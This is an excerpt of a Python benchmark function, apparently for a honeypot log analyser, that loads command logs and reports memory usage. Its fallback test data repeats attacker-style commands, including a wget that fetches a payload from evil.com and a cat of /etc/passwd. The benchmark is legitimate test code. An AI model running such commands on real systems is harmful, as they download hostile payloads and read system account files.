...
def benchmark(limit=10000):
    ...
    dataset_path = os.path.abspath(
        os.path.join(os.path.dirname(__file__), "../../var/log/cyanide/cyanide_synthetic.json")
    )
    if not os.path.exists(dataset_path):
        # Fallback to main log if synthetic not found
        dataset_path = os.path.abspath(
            os.path.join(os.path.dirname(__file__), "../../var/log/cyanide/cyanide.json")
        )
    ...
    if len(logs) < 100:
        ...
        logs = ["wget http://evil.com/payload.sh", "ls -la", "pwd", "cat /etc/passwd"] * (
            limit // 4
        )
    ...
    print(
        f"Memory Usage Increase: {final_memory - process_memory:.2f} MB (Total: {final_memory:.2f} MB)"
    )
